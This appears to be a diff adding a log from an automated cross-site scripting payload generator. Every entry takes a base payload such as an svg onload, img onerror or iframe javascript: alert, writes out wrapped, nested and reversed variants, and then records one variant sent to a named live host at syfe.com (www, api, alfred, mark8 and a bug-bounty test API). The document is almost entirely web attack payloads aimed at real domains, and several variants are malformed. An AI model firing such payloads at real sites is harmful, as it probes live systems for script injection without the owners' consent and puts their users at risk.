+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+[https://api-uat-bugbounty.nonprod.syfe.com] <svg/onload=iframe src='javascript:alert(1)'></iframe>
+
+--- 2025-05-23 06:53:42 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+[https://www.syfe.com] <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+
+--- 2025-05-23 06:53:52 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+[https://www.syfe.com] <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+
+--- 2025-05-23 06:54:01 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+[https://www.syfe.com] <svg/onload=iframe src='javascript:alert(1)'></iframe>
+
+--- 2025-05-23 06:54:15 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+[https://api.syfe.com] <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+
+--- 2025-05-23 06:54:26 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+[https://api.syfe.com] <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+
+--- 2025-05-23 06:54:39 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+[https://api.syfe.com] <svg/onload=iframe src='javascript:alert(1)'></iframe>
+
+--- 2025-05-23 06:54:53 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+[https://alfred.syfe.com] <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+
+--- 2025-05-23 06:55:08 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+[https://alfred.syfe.com] <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+
+--- 2025-05-23 06:55:19 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+[https://alfred.syfe.com] <svg/onload=iframe src='javascript:alert(1)'></iframe>
+
+--- 2025-05-23 06:55:30 ---
+Original: <svg/onload=alert(1)>
+Stilizovano: <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+Stilizovano: <svg/onload=svg/onload=alert(1)>
+Stilizovano: >)1(trela=daolno/gvs<
+Stilizovano: <iframe src='javascript:<svg/onload=alert(1)>'></iframe>
+Stilizovano: <body onload=<svg/onload=alert(1)>>
+Stilizovano: <img src='x' onerror='<svg/onload=alert(1)>'>
+[https://mark8.syfe.com] <script src='data:text/javascript,<svg/onload=alert(1)>'></script>
+
+--- 2025-05-23 06:55:41 ---
+Original: <img src=x onerror=alert(1)>
+Stilizovano: <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+Stilizovano: <body onload=<img src=x onerror=alert(1)>>
+Stilizovano: >)1(trela=rorreno x=crs gmi<
+Stilizovano: <svg/onload=img src=x onerror=alert(1)>
+Stilizovano: <img src='x' onerror='<img src=x onerror=alert(1)>'>
+Stilizovano: <iframe src='javascript:<img src=x onerror=alert(1)>'></iframe>
+[https://mark8.syfe.com] <script src='data:text/javascript,<img src=x onerror=alert(1)>'></script>
+
+--- 2025-05-23 06:55:49 ---
+Original: <iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <svg/onload=iframe src='javascript:alert(1)'></iframe>
+Stilizovano: <script src='data:text/javascript,<iframe src='javascript:alert(1)'></iframe>'></script>
+Stilizovano: <body onload=<iframe src='javascript:alert(1)'></iframe>>
+Stilizovano: <iframe src='javascript:<iframe src='javascript:alert(1)'></iframe>'></iframe>
+Stilizovano: >emarfi/<>')1(trela:tpircsavaj'=crs emarfi<
+Stilizovano: <img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>
+[https://mark8.syfe.com] <svg/onload=iframe src='javascript:alert(1)'></iframe>
